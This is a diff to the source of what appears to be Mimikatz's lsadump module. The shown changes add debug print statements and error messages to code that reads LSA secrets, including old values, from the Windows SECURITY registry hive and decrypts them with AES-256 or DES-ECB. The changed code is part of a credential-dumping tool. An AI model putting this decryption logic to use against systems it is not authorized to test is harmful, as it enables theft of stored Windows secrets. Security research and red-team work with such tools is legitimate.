@@ -594,13 +594,20 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 										}
 										kull_m_registry_RegCloseKey(hSecurity, hValue);
 									}
+
+									kprintf(L"****************** Trying for the OLD value *******************");
 									if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecret, L"OldVal", 0, KEY_READ, &hValue))
 									{
+										kprintf(L"Reg key opened");
 										if(kuhl_m_lsadump_decryptSecret(hSecurity, hValue, lsaKeysStream, lsaKeyUnique, &pOld, &dwOldSize))
 										{
+											kprintf(L"secret decrypted");
 											kuhl_m_lsadump_candidateSecret(dwOldSize, pOld, L"\nold/");
+											kprintf(L"dumped");
 										}
+										kprintf(L"closing");
 										kull_m_registry_RegCloseKey(hSecurity, hValue);
+										kprintf(L"closed");
 									}
 									kull_m_registry_RegCloseKey(hSecurity, hSecret);
 								}
@@ -773,19 +780,26 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 	PBYTE secret;
 	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};
 
+	kprintf(L"Decrypting secret");
 	if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, 0, NULL, NULL, &szSecret))
 	{
+		kprintf(L"Secret size value queried");
 		if(secret = (PBYTE) LocalAlloc(LPTR, szSecret))
 		{
+			kprintf(L"Memory allocated");
 			if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, 0, NULL, secret, &szSecret))
 			{
+				kprintf(L"Secret value queried");
 				if(lsaKeysStream)
 				{
+					kprintf(L"Key stream present");
 					if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) secret, szSecret, lsaKeysStream, NULL))
 					{
+						kprintf(L"pulled aes256");
 						*pSzBufferOut = ((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize;
 						if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
 						{
+							kprintf(L"copying secret");
 							status = TRUE;
 							RtlCopyMemory(*pBufferOut, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, *pSzBufferOut);
 						}
@@ -793,32 +807,42 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 				}
 				else if(lsaKeyUnique)
 				{
+					kprintf(L"unique present");
 					key.Buffer = lsaKeyUnique->key;
 					data.Length = data.MaximumLength = ((PNT5_HARD_SECRET) secret)->encryptedStructSize;
 					data.Buffer = ((PNT5_HARD_SECRET) secret)->encryptedSecret;
 
+					kprintf(L"Decrypting DES %p %p %p", &data, &key, &output);
 					if(RtlDecryptDESblocksECB(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
 					{
+						kprintf(L"Decrypted");
 						if(output.Buffer = (PBYTE) LocalAlloc(LPTR, output.Length))
 						{
+							kprintf(L"Decrypting ECB block");
 							output.MaximumLength = output.Length;
 							if(NT_SUCCESS(RtlDecryptDESblocksECB(&data, &key, &output)))
 							{
 								*pSzBufferOut = output.Length;
 								if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
 								{
+									kprintf(L"Copying value");
 									status = TRUE;
 									RtlCopyMemory(*pBufferOut, output.Buffer, *pSzBufferOut);
 								}
+								else PRINT_ERROR(L"LocalAlloc failed - pBufferOut");
 							}
+							else PRINT_ERROR(L"Decrypt DES block failed");
 							LocalFree(output.Buffer);
 						}
+						else PRINT_ERROR(L"LocalAlloc failed - output.Buffer");
 					}
+					else PRINT_ERROR(L"Unexpected result from RtlDecryptDESblocksECB");
 				}
 			}
 			else PRINT_ERROR(L"kull_m_registry_RegQueryValueEx Secret value KO\n");
 			LocalFree(secret);
 		}
+		else PRINT_ERROR(L"LocalAlloc failed - Secret");
 	}
 	else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx Secret value KO\n");
 
